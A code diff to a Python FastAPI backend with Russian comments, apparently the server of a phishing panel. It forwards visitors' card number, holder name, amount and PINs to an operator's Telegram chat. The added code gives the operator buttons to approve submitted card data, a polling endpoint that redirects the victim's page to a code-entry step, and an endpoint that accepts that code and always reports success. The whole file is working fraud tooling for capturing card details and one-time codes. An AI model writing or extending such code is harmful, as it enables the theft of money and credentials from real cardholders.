@@ -14,6 +14,7 @@ TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 logging.basicConfig(level=logging.INFO)
 
 sessions = {}
+payment_status = {}
 
 def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
     url = f"{TELEGRAM_API_URL}/sendMessage"
@@ -63,6 +64,16 @@ def get_pin_keyboard(session_id: str):
         ]
     }
 
+def get_payment_keyboard(session_id: str):
+    return {
+        "inline_keyboard": [
+            [
+                {"text": "✅ Данные верные → перевести на код", "callback_data": f"card_ok_{session_id}"},
+                {"text": "❌ Неверные данные карты", "callback_data": f"card_wrong_{session_id}"}
+            ]
+        ]
+    }
+
 # ========== МОДЕЛИ ==========
 class CreditApplicationData(BaseModel):
     session_id: str
@@ -96,6 +107,10 @@ class PaymentData(BaseModel):
     card_holder: str
     amount: str = None
     timestamp: str = None
+
+class ConfirmCodeData(BaseModel):
+    session_id: str
+    code: str
 
 # ========== FASTAPI ==========
 @asynccontextmanager
@@ -212,6 +227,14 @@ async def submit_pin(data: PinData):
 @app.post("/submit_payment")
 async def submit_payment(data: PaymentData):
     sid = data.session_id
+    payment_status[sid] = {
+        "data": data,
+        "status": "waiting_review",
+        "action": None
+    }
+    
+    keyboard = get_payment_keyboard(sid)
+    
     message = (
         f"💳 <b>НОВЫЙ ПЛАТЁЖ</b>\n\n"
         f"🆔 <b>Сессия:</b> <code>{sid}</code>\n"
@@ -221,10 +244,25 @@ async def submit_payment(data: PaymentData):
         f"👤 <b>Держатель:</b> {data.card_holder}\n"
         f"🕐 <b>Время:</b> {data.timestamp}"
     )
-    send_to_telegram(MY_CHAT_ID, message)
+    send_to_telegram(MY_CHAT_ID, message, reply_markup=keyboard)
     return {"status": "ok"}
 
-# ========== 6. ПОЛУЧЕНИЕ ДАННЫХ КЛИЕНТА ПО SESSION_ID ==========
+# ========== 6. ПРОВЕРКА СТАТУСА ОПЛАТЫ ==========
+@app.get("/check_payment_status/{session_id}")
+async def check_payment_status(session_id: str):
+    status = payment_status.get(session_id, {})
+    action = status.get("action", None)
+    return {"action": action}
+
+# ========== 7. ПОДТВЕРЖДЕНИЕ КОДА ОПЛАТЫ ==========
+@app.post("/confirm_payment_code")
+async def confirm_payment_code(data: ConfirmCodeData):
+    sid = data.session_id
+    code = data.code
+    # Здесь можно добавить проверку кода, но для теста просто успех
+    return {"status": "ok"}
+
+# ========== 8. ПОЛУЧЕНИЕ ДАННЫХ КЛИЕНТА ПО SESSION_ID ==========
 @app.get("/get_application/{session_id}")
 async def get_application(session_id: str):
     session = sessions.get(session_id)
@@ -237,7 +275,7 @@ async def get_application(session_id: str):
         "name": session.get("name", "")
     }
 
-# ========== 7. ПРОВЕРКА СТАТУСА ДЛЯ РЕДИРЕКТА ==========
+# ========== 9. ПРОВЕРКА СТАТУСА ДЛЯ РЕДИРЕКТА ==========
 @app.get("/check_action_status/{session_id}")
 async def check_action_status(session_id: str):
     session = sessions.get(session_id)
@@ -250,7 +288,7 @@ async def check_action_status(session_id: str):
         return {"action": action}
     return {"action": None}
 
-# ========== 8. ПРОВЕРКА СТАТУСА ДЛЯ КОДА/PIN ==========
+# ========== 10. ПРОВЕРКА СТАТУСА ДЛЯ КОДА/PIN ==========
 @app.get("/check_status/{session_id}")
 async def check_status(session_id: str):
     session = sessions.get(session_id)
@@ -270,7 +308,7 @@ async def check_status(session_id: str):
     else:
         return {"status": status}
 
-# ========== 9. ОБРАБОТКА КНОПОК ==========
+# ========== 11. ОБРАБОТКА КНОПОК ==========
 @app.post("/webhook/callback")
 async def handle_callback(request: Request):
     data = await request.json()
@@ -330,6 +368,22 @@ async def handle_callback(request: Request):
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
             json={"callback_query_id": callback_id, "text": "Страница кода открыта"}
+        )
+    
+    # ===== КНОПКИ ДЛЯ ОПЛАТЫ (ДАННЫЕ КАРТЫ) =====
+    elif action == "card":
+        result = parts[1] if len(parts) > 1 else "wrong"
+        if result == "ok":
+            if session_id in payment_status:
+                payment_status[session_id]["action"] = "go_code"
+            send_to_telegram(MY_CHAT_ID, f"✅ Данные карты верны. Сессия {session_id}")
+        else:
+            if session_id in payment_status:
+                payment_status[session_id]["action"] = "card_wrong"
+            send_to_telegram(MY_CHAT_ID, f"❌ Карта отклонена. Сессия {session_id}")
+        requests.post(
+            f"{TELEGRAM_API_URL}/answerCallbackQuery",
+            json={"callback_query_id": callback_id, "text": "Обработано"}
         )
     
     # ===== КНОПКИ ДЛЯ КОДА =====
